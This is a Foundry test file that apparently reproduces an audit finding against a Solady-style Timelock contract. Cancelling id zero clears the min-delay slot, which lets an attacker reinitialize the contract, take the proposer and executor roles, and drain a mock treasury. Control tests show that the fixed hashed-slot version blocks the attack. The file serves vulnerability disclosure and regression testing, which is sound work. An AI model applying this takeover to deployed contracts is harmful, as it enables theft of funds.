// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import {
    Exploit,
    Timelock,
    MockToken,
    Treasury
} from "./45408-cancelling-bytes320-allows-timelock-takeover-spearbit-none-c.sol";

contract SoladyTimelockCancelZeroTest is Test {
    function _init(Timelock tl, uint256 delay, address canceller) internal {
        address[] memory proposers = new address[](1);
        proposers[0] = canceller;
        address[] memory executors = new address[](1);
        executors[0] = canceller;
        address[] memory cancellers = new address[](1);
        cancellers[0] = canceller;
        tl.initialize(delay, address(0xA11CE), proposers, executors, cancellers);
    }

    function test_exploit_canceller_becomes_proposer_and_drains() public {
        Exploit e = new Exploit();
        e.run();

        assertTrue(e.tl().hasRole(address(e), e.tl().PROPOSER_ROLE()), "attacker is proposer");
        assertTrue(e.tl().hasRole(address(e), e.tl().EXECUTOR_ROLE()), "attacker is executor");
        assertEq(e.tl().minDelay(), 0, "reinitialized delay is 0");
        uint256 taken = e.token().balanceOf(address(e.sink()));
        uint256 left = e.token().balanceOf(address(e.treasury()));
        console.log("tokens taken by attacker sink", taken);
        console.log("tokens left in treasury", left);
        assertEq(taken, 1000 ether, "attacker executed their own 1000 token payout");
        assertEq(left, 0, "treasury emptied");
    }

    function test_control_real_id_and_even_delay_do_not_clear_slot() public {
        Timelock tl = new Timelock();
        _init(tl, 1001, address(this));
        uint256 slotBefore = tl.rawSlot();
        assertEq(slotBefore, ~uint256(1001), "odd delay stored as bitwise not");

        bytes32 id = tl.propose(address(this), address(this), 1, 1001);
        tl.cancel(id);
        assertEq(tl.rawSlot(), slotBefore, "cancelling a real id leaves the min-delay slot");
        assertEq(tl.minDelay(), 1001, "min delay unchanged");

        vm.expectRevert();
        tl.initialize(0, address(this), new address[](0), new address[](0), new address[](0));

        Timelock evenTl = new Timelock();
        _init(evenTl, 1000, address(this));
        uint256 evenSlot = evenTl.rawSlot();
        vm.expectRevert();
        evenTl.cancel(bytes32(0));
        assertEq(evenTl.rawSlot(), evenSlot, "even delay makes cancel(0) revert");
    }

    function test_control_hashed_slot_rejects_cancel_zero() public {
        Timelock tl = new Timelock();
        _init(tl, 1001, address(this));
        uint256 slotBefore = tl.rawSlot();
        vm.expectRevert();
        tl.cancelFixed(bytes32(0));
        assertEq(tl.rawSlot(), slotBefore, "fixed cancel(0) does not clear min delay");
        assertEq(tl.minDelay(), 1001, "fixed cancel(0) leaves the delay in place");
    }
}
